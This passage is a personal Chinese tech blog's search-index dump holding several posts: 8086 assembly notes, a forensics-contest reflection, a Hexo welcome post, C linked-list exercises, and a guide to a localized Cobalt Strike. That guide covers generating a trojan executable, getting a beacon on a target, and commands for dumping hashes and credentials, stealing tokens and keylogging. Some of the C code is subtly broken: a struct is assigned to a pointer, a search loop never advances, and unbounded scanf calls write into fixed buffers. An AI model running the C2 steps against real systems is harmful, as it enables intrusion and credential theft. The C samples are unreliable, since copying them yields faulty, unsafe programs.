cs:codesg\n\ncodesg segment\n\nstart:  mov ax,0123H\n        mov bx,0456H\n        add ax,bx\n        add ax,ax\n\n        mov ax,4c00H\n        int 21h\ncodesg ends\nend\n\n&#x2F;&#x2F; 汇编指令\n有对应的机器码的指令，可以被编译为机器指令，最终为CPU所执行。\n\n&#x2F;&#x2F; 伪指令\n没有对应的机器码的指令，最终不被CPU所执行。\n伪指令是由编译器来执行的指令，编译器根据伪指令来进行相关的编译工作。\n\n&#x2F;&#x2F; 定义一个段\nsegment和ends是一对成对使用的伪指令，\n这是在写可被编译器编译的汇编程序时，必须要用到的一对伪指令。\nsegment和ends的功能时定义一个段，\nsegment说明一个段开始，ends说明一个段结束。\n\n一个段必须有一个名称来标识，使用格式为：\n段名 segment\n段名 ends\n\n一个汇编程序是由多个段组成的，这些段被用来存放代码、数据或当作栈空间来使用。\n\n一个有意义的汇编程序中至少要有一个短，这个段用来存放代码。\n\n&#x2F;&#x2F; 真正的结束\nend是一个汇编程序的结束标记，编译器在编译汇编程序的过程中，\n如果碰到了伪指令的end，就结束对源程序的编译。\n\n如果程序写完了，要在结尾处加上伪指令end。\n否则编译器在编译程序时，无法知道程序在何处结束。\n\n切记：不要搞混了end和ends。\n\n&#x2F;&#x2F; 寄存器与段的关联假设\nassume：含义为&quot;假设&quot;；\n它假设某一段寄存器和程序中的某一个用segment···ends定义的段相关联。\n通过assume说明这种关联，在需要的情况下，编译程序可以将段寄存器和某一个具体的段相联系。\n\n&#x2F;&#x2F; 源程序中的“程序”\n\n汇编源程序：\n伪指令（编译器处理）\n汇编语言（编译为机器码）\n\n程序：源程序中最终由计算机执行、处理的指令或数据。\n\n&#x2F;&#x2F; 标号\n一个标号指代了一个地址；\n\ncodesg:放在segment的前面，作为一个段的名称，\n这个段的名称最终将被编译、链接程序处理为一个段的段地址。\n\n&#x2F;&#x2F; 程序返回\n应该在程序的末尾添加返回的程序段。\nmov ax,4c00H\nint 21H\n&#x2F;&#x2F; 这两条指令所实现的功能就是程序返回。\n\n\n&#x2F;&#x2F; 语法错误和逻辑错误\n语法错误，程序在编译时被编译器发现的错误，容易发现；\n逻辑错误，程序在编译时不能表现出来的、在运行时发生的错误；\n\n3. 编辑源程序assume cs:abc\n\nabc segment\n    mov ax,2\n    add ax,ax\n    add ax,ax\n\n    mov ax,4c00H\n    int 21H\nabc ends\n\nend\n\n&#x2F;&#x2F; 一般来说，有两类错误使我们得不到所期望的目标文件：\n· 我们程序中有“Server Errors”；\n· 找不到所给出的源程序文件；\n\n4. 以简化的方式进行编译和链接&#x2F;&#x2F; 对源程序进行编译连接：\n使用汇编语言编译程序（MASM.EXE）对源程序文件中的源程序进行编译，产生目标文件【.obj文件】\n再用连接程序（LINK.EXE）对目标文件进行连接，生成可在操作系统中直接运行的可执行文件【.EXE文件】\n\n例：\nmasm 1.asm;\nlink 1.obj\n或\nml 1.asm\n\n&#x2F;&#x2F; 关于编译和链接\n链接的作用：\n· 当源程序很大时，可以将它分为多个源程序文件来编译，\n每个源程序编译成为目标文件后，再用链接程序将它们链接到一起，生成一个可执行文件；\n· 程序中调用了某个库文件中的子程序，\n需要将这个库文件和该程序生成的目标文件链接到一起，生成一个可执行文件；\n· 一个源程序编译后，得到了存有机器码的目标文件，\n目标文件中的有些内容还不能直接用来生成可执行文件，\n连接程序将这些内容处理为最终的可执行信息。\n所以在只有一个源程序文件，而又不需要调用某个库中的子程序的情况下，\n也必须用连接程序对目标文件进行处理，生成可执行文件；\n\n5. 可执行文件中的程序装入内存并运行的原理1. 在 DOS 中，可执行文件中的程序 P1 若要运行，必须有一个正在运行的程序 P2，\n将 P1 从可执行文件中加载入内存，将 CP U的控制权交给P1，P1 才能得以运行；\n\n2. 当 P1 运行完毕后，应该将 CPU 的控制权交还给使他得以运行的程序；\n\n3. 操作系统的外壳：\n（1）操作系统是由多个功能模块组成的庞大、复杂的软件系统，任何通用的操作系统，\n都需要提供一个称为 shell（外壳）的程序，用户（操作人员）使用这个程序来操作计算机系统工作；\n（2）DOS 中有一个程序 command.com，这个程序在 DOS 中称为命令解释器，也就是 DOS 系统的 shell；\n \n4. 执行可执行文件 1.exe 时，\n（1）什么程序将 CPU 的控制权交给了 1.exe？\n（2）将程序 1.exe 加载入内存后，如何使程序得以运行？\n（3）1.exe 程序运行结束后，返回到了哪里？\n答：\n（1）在 DOS 中直接执行 1.exe 时，是正在运行的 cmd.exe 将 1.exe 中的程序加载入内存；\n（2）cmd.exe 设置 CPU 的 CS:IP 指向程序的第一条指令（即，程序的入口），从而使程序得以运行；\n（3）程序运行结束后，返回 cmd.exe 中，CPU 继续运行 cmd.exe；\n\n\n6. 程序执行过程的跟踪assume cs:codesg\n\ncodesg segment\n\nstart:  mov ax,0123H\n        mov bx,0456H\n        add ax,bx\n        add ax,ax\n\n        mov ax,4c00H\n        int 21H\ncodesg ends\n\nend start\n\nEXE文件中的程序的加载过程\n· 程序加载后，ds 中存放着程序所在内存区的段地址，\n这个内存区的偏移地址为 0 ，则程序所在的内存区的地址为：ds:0；\n\n· 这个内存区的前256个字节中存放的是 PSP，dos 用来和程序进行通信；\n\n· 从 256 字节处向后的空间存放的是程序；\n\n· 所以，我们从 ds 中可以得到 PSP 的段地址 SA，PSP 的偏移地址为 0，则物理地址为 SA×16+0；\n\n· 因为 PSP 占 256（100H）字节，所以程序的物理地址是：\nSA×16+0+256&#x3D; SA×16+16×16&#x3D;（SA+16）×16+0，可用段地址和偏移地址表示为：SA+10:0；","slug":"8086汇编02","date":"2023-07-14T03:20:34.000Z","categories_index":"文章","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"d183dfb007b882d9bb397f4054d5a867","title":"2023首届盘古石杯结束后的随想","content":"刚刚结束了“盘古石”杯电子取证的比赛，是一场很精彩的比赛，数字取证也许漫长而枯燥，但是对于我这种同样无趣的人来说，反而是一种乐趣。看着发光的电脑屏幕，突然有一种想哭的感觉，似乎是什么都没有改变，一切又已经截然不同。同样是题目做不出来，同样是临近收卷时的心悸，可是却已波澜不惊。我担心，这已经是一种习惯了，但是桌面留下的痕迹告诉我不是。因为报名的晚，所以是一个人参与的，理论上五个小时的话，如果很厉害的人是可以都做完的。显然，我不是很厉害的人。承认自己会失败时很重要的，但更重要的时学习如何去弥补，我想对曾经逃避不敢正视未来的自己说，你真棒，完成了第一步，然后，剩下的答案就交给当下的我去书写吧。能做出来的题都是一眼能看出来答案的题目，但是从纷乱的数据中找出线索很有成就感，可不是谁都可以连续五个小时坐在电脑前一动不动盯着屏幕的！尝试真的很重要，记得第一次护网面试的时候紧张的语无伦次，第二次就已经可以泰然处之了。如果尝试过后所获得的经验远大于面对未知的恐惧，那么少年，勇敢的向前走吧！无论是盘古石还是火眼，数字取证的工具都很好用，但是正确的使用方法也很重要，错误的使用工具大概是每一个初学者都会犯的错误，比如我。有一些题目如果晚一些交就好了，明明可以作对的，有些不该犯的错误要避免。下一次，会更好的。就像人来人往的街道一般，感觉时间过的好快，最近都有些忙不过来，放弃是很简单的一件事，可是真的放弃了，反而会怅然若失吧。嗯，是时间去做一些更有意义的事情了，我收起了电脑，我的达摩克利斯之剑，挺身站起——也许有一天，这个世界真的会因为我的改变，没有了哭声。\n","slug":"盘古石赛后感","date":"2023-05-06T07:49:36.000Z","categories_index":"无用空间","tags_index":"随想","author_index":"南瓜の无名"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2023-05-05T05:50:17.266Z","categories_index":"test","tags_index":"test","author_index":"南瓜の无名"},{"id":"683422935a9a4a685de276df60649fb9","title":"windows下cobaltstrike的简单使用笔记（汉化版）","content":"1.配置和启动配置teamserver，需要root权限。\n\n.&#x2F;teamserver &lt;host&gt; &lt;password&gt; [&#x2F;path&#x2F;to&#x2F;c2.profile] [YYYY-MM-DD]\n&lt;host&gt; 必需参数 团队服务器IP\n&lt;password&gt; 必需参数 连接服务器的密码\n[&#x2F;path&#x2F;to&#x2F;c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性\n[YYYY-MM-DD] 可选参数 所有payload的终止时间\n\n\n汉化版是cobaltStrikeCN，里面有一个cs.bat，点击命令如下。\njava -Dfile.encoding&#x3D;UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar\n\n\n修改主机和密码为刚才设置的服务端ip和密码，端口默认50050，用户名随意，点击连接，即可进入cs图形化界面。\n2.菜单功能（中英对照）cobalt strick\n\nNew Connection       # 新建连接，允许连接多个服务器端\nPreferences           # 设置（界面、控制台样式设置等）\nVisualization       # 视图（结果输出模式） \n# Pivot Graph 枢纽试图\n# Session Table 会话列表\n# Target Table 目标列表\nVPN Interface        # VPN接口\nListeners           # 监听器（创建Listener）\nScript Manangers    # 脚本管理器\nClose              # 关闭\n\nView （视图）\n\nApplications     #显示目标机的应用信息\nCredentials      #凭证（所有通过Mimikatz抓取的密码都存储在这里）\nDownloads       #下载文件\nEvent Log        #事件日志，主机上线记录及团队交流记录\nKeystrokes      #键盘记录\nProxy Pivots    #代理模块\nScreenshots     #查看目标机截图\nScript Console  #脚本控制台\nTargets          #显示目标主机\nWeb Log         #Web日志\n\nAttacks（攻击）\n\nPackages    # 生成后门\n    -- HTML Aplications   # 网页后门\n    -- MS Office MAcro    #office宏后门\n    -- Payload Generator  #生成各种编程语言的后门\n    -- Windows Executable #可执行的exe文件\n    -- Windows Executable(s) #生成无状态的可执行exe文件\nWeb Drive—by   #钓鱼攻击\n    -- Mange  管理器\n    -- Clone Site  ##克隆网站，可以记录受害者提交的数据；\n    -- Host file   # 提供一个文件下载，可以修改Mime信息； 可以配合DNS欺骗实现挂马效果使用\n    -- Script Web Delivery  # 类似于msf 的web_delivery \n    -- Signed Applet Attack # 使用java自签名的程序进行钓鱼攻击\n    -- Smart Applet Attack  #自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本；\n    -- System Profiler # 用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等。\n Spear Phish       #钓鱼攻击\n\nReporting（报告）\n\n3.利用CS生成木马1.打开监听器模块，点击add添加新的监听器。\n\n2.依照箭头配置完成后save保存，用户名随意。\n\n监听器参数：\nname\t                # 为监听器名字，可任意\npayload\t                # payload类型\nHTTP Hosts\t        # shell反弹的主机，也就是我们 CS 服务器的 IP\nHTTP Hosts(Stager)\t# Stager的马请求下载payload的地址\nHTTP Port(C2)\t        # C2监听的端口\n# Cobaltstrike 4.1 版本提供了 8 种监听器\n\nbeacon_xx 系列为 Cobalt Strike 自身内置的监听器，\n即在目标主机执行相应的payload，获取 shell 到 CS 上，\n包括 dns、http、https、smb 四种方式的监听器；\n\nforeign 系列为外部监听器，通常与 MSF 或者 Armitage 联动，\n例如获取 meterpreter 到 MSF上。\n\n3.找到攻击模块-&gt;生成后门，选择Windows Executable。\n\n4.选择创建好的监听器。\n\n5.点击generate创建，选择创建木马的保存路径，生成artifact.exe木马文件。\n6.目标主机运行木马后，成功上线。\n\nInteract  # 互交窗口\n&#39;&#39;&#39;\nBeacon\n成功将所控制的目标机资源上线之后，团队内的其他成员即可对该台机器进行进一步渗透。\n团队成员通过点击目标机右键，选择 Interact 功能（进入 beacon），就可以用它来执行各种命令，开始对目标及进行操作。\n进一步可用help+命令的方式查看具体命令参数说明。\n\n【注意】\n1. 在 Cobalt Strike 中，默认心跳为 60s（即 CS 与受害机默认 60s 才进行一次交互），故执行命令的响应速度很慢，在下载文件时更加明显，所以根据实战环境把时间降低，建议不要太快，否则流量会相对明显。在这里执行命令 sleep 5 可以把交互时间设置为 5 秒。\n2. 同时在 beacon 中，如果想对目标进行命令管理，需要在前面加上shell关键词，如shell whoami、shell ipconfig等。\n&#39;&#39;&#39;\n\n\nAccess   \n    -- Dump Hashes  #  获取hash（只能权限为administor使用）\n    -- elevate      #提权\n    -- Golden Ticket #生成黄金票据注入当前会话\n    -- Make Token    # 凭证转换\n    -- One-liner    # 反弹shell\n    -- Run Mimikatz # 运行 Mimikatz\n    --Spawn As  #用其他用户生成Cobalt Strike的beacon\nExplore\n    -- Browser Pivot  #  劫持目标浏览器进程并代理\n    -- Destop Vnc   # 桌面互交\n    -- File Browser # 文件浏览器\n    -- Net View     # 网络列表\n    -- Port Scan    # 端口扫描\n    -- Process List # 进程列表\n    -- Screenshot   # 截图\nPrivoting\n    -- SOCKS Server # 代理服务\n    -- Listener     # 反向端口转发\n    -- Deploy VPN   # 部署VPN\nSpawn   #新的通讯模式并生成会话\nSession     #会话管理，删除，心跳时间，退出，备注\n\nBeacon Commands\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n    Command                   Description\n    -------                   -----------\n    argue                     进程参数欺骗\n    blockdlls                 在子进程中阻止非Microsoft的DLLs文件\n    browserpivot              注入受害者浏览器进程\n    bypassuac                 绕过UAC\n    cancel                    取消正在进行的下载\n    cd                        切换目录\n    checkin                   强制让被控端回连一次\n    clear                     清除beacon内部的任务队列\n    connect                   通过TCP连接到Beacon\n    covertvpn                 部署Covert VPN客户端\n    cp                        复制文件\n    dcsync                    从DC中提取密码哈希\n    desktop                   远程VNC\n    dllinject                 反射DLL注入进程\n    dllload                   使用LoadLibrary将DLL加载到进程中\n    download                  下载文件\n    downloads                 列出正在进行的文件下载\n    drives                    列出目标盘符\n    elevate                   尝试提权\n    execute                   在目标上执行程序(无输出)\n    execute-assembly          在目标上内存中执行本地.NET程序\n    exit                      退出beacon\n    getprivs                  对当前令牌启用系统权限\n    getsystem                 尝试获取SYSTEM权限\n    getuid                    获取用户ID\n    hashdump                  转储密码哈希值\n    help                      帮助\n    inject                    在特定进程中生成会话\n    jobkill                   杀死一个后台任务\n    jobs                      列出后台任务\n    kerberos_ccache_use       从ccache文件中导入票据应用于此会话\n    kerberos_ticket_purge     清除当前会话的票据\n    kerberos_ticket_use       从ticket文件中导入票据应用于此会话\n    keylogger                 键盘记录\n    kill                      结束进程\n    link                      通过命名管道连接到Beacon\n    logonpasswords            使用mimikatz转储凭据和哈希值\n    ls                        列出文件\n    make_token                创建令牌以传递凭据\n    mimikatz                  运行mimikatz\n    mkdir                     创建一个目录\n    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)\n    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)\n    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)\n    mode http                 使用HTTP作为通信通道\n    mv                        移动文件\n    net                       net命令\n    note                      给当前目标机器备注       \n    portscan                  进行端口扫描\n    powerpick                 通过Unmanaged PowerShell执行命令\n    powershell                通过powershell.exe执行命令\n    powershell-import         导入powershell脚本\n    ppid                      为生成的post-ex任务设置父PID\n    ps                        显示进程列表\n    psexec                    使用服务在主机上生成会话\n    psexec_psh                使用PowerShell在主机上生成会话\n    psinject                  在特定进程中执行PowerShell命令\n    pth                       使用Mimikatz进行传递哈希\n    pwd                       当前目录位置\n    reg                       查询注册表\n    rev2self                  恢复原始令牌\n    rm                        删除文件或文件夹\n    rportfwd                  端口转发\n    run                       在目标上执行程序(返回输出)\n    runas                     以另一个用户权限执行程序\n    runasadmin                在高权限下执行程序\n    runu                      在另一个PID下执行程序\n    screenshot                屏幕截图\n    setenv                    设置环境变量\n    shell                     cmd执行命令\n    shinject                  将shellcode注入进程\n    shspawn                   生成进程并将shellcode注入其中\n    sleep                     设置睡眠延迟时间\n    socks                     启动SOCKS4代理\n    socks stop                停止SOCKS4\n    spawn                     生成一个会话 \n    spawnas                   以其他用户身份生成会话\n    spawnto                   将可执行程序注入进程\n    spawnu                    在另一个PID下生成会话\n    ssh                       使用ssh连接远程主机\n    ssh-key                   使用密钥连接远程主机\n    steal_token               从进程中窃取令牌\n    timestomp                 将一个文件时间戳应用到另一个文件\n    unlink                    断开与Beacon的连接\n    upload                    上传文件\n    wdigest                   使用mimikatz转储明文凭据\n    winrm                     使用WinRM在主机上生成会话\n    wmi                       使用WMI在主机上生成会话","slug":"cs","date":"2023-04-30T12:30:34.000Z","categories_index":"文章","tags_index":"渗透工具","author_index":"南瓜の无名"},{"id":"a6f0cc9299816c24b5762d16aaeb2235","title":"c语言学习笔记_02单链表","content":"单链表链表是一种常见的数据结构。根据需求，我们可以构造出单链表、双链表、循环链表和块状链表等。链表的出现很大程度上弥补了数组的先天不足。\n\nstruct Test\n&#123;\n    int x;\n    int y;\n    struct Test *test;\n&#125;;\n\n\n在单链表中插入元素\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    struct Book *next;\n&#125;;\n\nvoid getInput(struct Book *book)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n&#125;\n\nvoid addBook(struct Book **library)\n&#123;\n    struct Book *book, *temp;\n\n    book &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    getInput(book);\n\n    if (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;    \n        &#x2F;&#x2F; 首先，将 *library 的值赋给 temp，保存了链表的头部节点。\n        *library &#x3D; book;    \n        &#x2F;&#x2F; 将 book 的地址赋给 *library，即将新的书籍节点作为链表的新头部节点。\n        book-&gt;next &#x3D; temp;\n        &#x2F;&#x2F; 将 temp 赋给 book-&gt;next，即将原来的链表头部节点作为新的书籍节点的下一个节点。\n    &#125;\n    else\n    &#123;\n        *library &#x3D; *book;\n        &#x2F;&#x2F; *library &#x3D; *book; 将 book 的值赋给 *library，即将新的书籍节点作为链表的第一个节点。\n\n        book-&gt;next &#x3D; NULL;\n        &#x2F;&#x2F; book-&gt;next &#x3D; NULL; 将新的书籍节点的下一个节点指针 next 设置为 NULL，表示链表只有一个节点。\n    &#125;\n&#125;\n\nvoid printLibrary(struct Book *library)\n&#123;\n    struct Book *book;\n    int count &#x3D; 1;\n\n    book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        printf(&quot;Book%d\\n&quot;, count);\n        printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n        printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n        book &#x3D; book-&gt;next;\n        count++;\n    &#125;\n&#125;\n\nvoid releaseLibrary(struct Book **library)\n&#123;\n    struct Book *temp;\n    while (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;\n        *library &#x3D; (*library)-&gt;next;\n        free(temp);\n    &#125;\n&#125;\n\nint main(void)\n&#123;\n    struct Book *library &#x3D; NULL;\n    int ch;\n\n    while (1)\n    &#123;\n        printf(&quot;请问是否需要录入书籍信息：&quot;);\n        do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            addBook(&amp;library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n    &#125;\n\n    printf(&quot;请问是否需要打印图书信息：&quot;);\n    do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            printLibrary(library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n\n    releaseLibrary(&amp;library);\n\n    return 0;\n&#125;\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    struct Book *next;\n&#125;;\n\nvoid getInput(struct Book *book);\nvoid addBook(struct Book **library);\nvoid printLibrary(struct Book *library);\nvoid releaseLibrary(struct Book **library);\n\nvoid getInput(struct Book *book)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n&#125;\n\nvoid addBook(struct Book **library)\n&#123;\n    struct Book *book, *temp;\n\n    book &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    getInput(book);\n\n    if (*library !&#x3D; NULL)\n    &#123;\n       temp &#x3D; *library;\n       &#x2F;&#x2F; 定位单链表的尾部位置\n       while (temp-&gt;next !&#x3D; NULL)\n       &#123;\n            temp &#x3D; temp-&gt;next;\n       &#125;\n       &#x2F;&#x2F; 插入数据\n       temp-&gt;next &#x3D; book;\n       book-&gt;next &#x3D; NULL;\n    &#125;\n    else\n    &#123;\n        *library &#x3D; book;\n        book-&gt;next &#x3D; NULL;\n    &#125;\n&#125;\n\nvoid printLibrary(struct Book *library)\n&#123;\n    struct Book *book;\n    int count &#x3D; 1;\n\n    book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        printf(&quot;Book%d\\n&quot;, count);\n        printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n        printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n        book &#x3D; book-&gt;next;\n        count++;\n    &#125;\n&#125;\n\nvoid releaseLibrary(struct Book **library)\n&#123;\n    struct Book *temp;\n    while (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;\n        *library &#x3D; (*library)-&gt;next;\n        free(temp);\n    &#125;\n&#125;\n\nint main(void)\n&#123;\n    struct Book *library &#x3D; NULL;\n    int ch;\n\n    while (1)\n    &#123;\n        printf(&quot;请问是否需要录入书籍信息：&quot;);\n        do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            addBook(&amp;library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n    &#125;\n\n    printf(&quot;请问是否需要打印图书信息：&quot;);\n    do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            printLibrary(library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n\n    releaseLibrary(&amp;library);\n\n    return 0;\n&#125;\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    struct Book *next;\n&#125;;\n\nvoid getInput(struct Book *book);\nvoid addBook(struct Book **library);\nvoid printLibrary(struct Book *library);\nvoid releaseLibrary(struct Book **library);\n\nvoid getInput(struct Book *book)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n&#125;\n\nvoid addBook(struct Book **library)\n&#123;\n    struct Book *book;\n    static struct Book *tail;\n\n    book &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    getInput(book);\n\n    if (*library !&#x3D; NULL)\n    &#123;\n       tail-&gt;next &#x3D; book;\n       book-&gt;next &#x3D; NULL;\n    &#125;\n    else\n    &#123;\n        *library &#x3D; book;\n        book-&gt;next &#x3D; NULL;\n    &#125;\n    tail &#x3D; book;\n&#125;\n\nvoid printLibrary(struct Book *library)\n&#123;\n    struct Book *book;\n    int count &#x3D; 1;\n\n    book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        printf(&quot;Book%d\\n&quot;, count);\n        printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n        printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n        book &#x3D; book-&gt;next;\n        count++;\n    &#125;\n&#125;\n\nvoid releaseLibrary(struct Book **library)\n&#123;\n    struct Book *temp;\n    while (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;\n        *library &#x3D; (*library)-&gt;next;\n        free(temp);\n    &#125;\n&#125;\n\nint main(void)\n&#123;\n    struct Book *library &#x3D; NULL;\n    int ch;\n\n    while (1)\n    &#123;\n        printf(&quot;请问是否需要录入书籍信息：&quot;);\n        do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            addBook(&amp;library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n    &#125;\n\n    printf(&quot;请问是否需要打印图书信息：&quot;);\n    do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            printLibrary(library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n\n    releaseLibrary(&amp;library);\n\n    return 0;\n&#125;\n\n搜索单链表#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    struct Book *next;\n&#125;;\n\nvoid getInput(struct Book *book);\nvoid addBook(struct Book **library);\nvoid printLibrary(struct Book *library);\nstruct Book *searchBook(struct Book *library, char *target);\nvoid printBook(struct Book *book);\nvoid releaseLibrary(struct Book **library);\n\nvoid getInput(struct Book *book)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n&#125;\n\nvoid addBook(struct Book **library)\n&#123;\n    struct Book *book;\n    static struct Book *tail;\n\n    book &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    getInput(book);\n\n    if (*library !&#x3D; NULL)\n    &#123;\n       tail-&gt;next &#x3D; book;\n       book-&gt;next &#x3D; NULL;\n    &#125;\n    else\n    &#123;\n        *library &#x3D; book;\n        book-&gt;next &#x3D; NULL;\n    &#125;\n    tail &#x3D; book;\n&#125;\n\nvoid printLibrary(struct Book *library)\n&#123;\n    struct Book *book;\n    int count &#x3D; 1;\n\n    book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        printf(&quot;Book%d\\n&quot;, count);\n        printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n        printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n        book &#x3D; book-&gt;next;\n        count++;\n    &#125;\n&#125;\n\nstruct Book *searchBook(struct Book *library, char *target)\n&#123;\n    struct Book *book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        if (!strcmp(book-&gt;title, target) || !strcmp(book-&gt;author, target))\n        &#123;\n            break;\n        &#125;\n        book &#x3D; book-&gt;next;\n    &#125;\n    return book;\n&#125;\n\nvoid printBook(struct Book *book)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n    printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n&#125;\n\nvoid releaseLibrary(struct Book **library)\n&#123;\n    struct Book *temp;\n    while (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;\n        *library &#x3D; (*library)-&gt;next;\n        free(temp);\n    &#125;\n&#125;\n\nint main(void)\n&#123;\n    struct Book *library &#x3D; NULL;\n    struct Book *book;\n    char input[128];\n    int ch;\n\n    while (1)\n    &#123;\n        printf(&quot;请问是否需要录入书籍信息：&quot;);\n        do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        getchar();\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            addBook(&amp;library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n    &#125;\n\n    printf(&quot;请问是否需要打印图书信息：&quot;);\n    do\n    &#123;\n        ch &#x3D; getchar();\n    &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n    getchar();\n\n    if (ch &#x3D;&#x3D; &#39;Y&#39;)\n    &#123;\n        printLibrary(library);\n    &#125;\n    printf(&quot;\\n请输入书名或作者：&quot;);\n    scanf(&quot;%s&quot;, input);\n\n    book &#x3D; searchBook(library, input);\n    if(book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;很抱歉，没能找到！\\n&quot;);\n    &#125;\n    else\n    &#123;\n        do\n        &#123;\n            printf(&quot;已找到符合条件的图书...\\n&quot;);\n            printBook(book);\n        &#125; while (searchBook(book-&gt;next, input) !&#x3D; NULL);\n    &#125;\n\n    releaseLibrary(&amp;library);\n\n    return 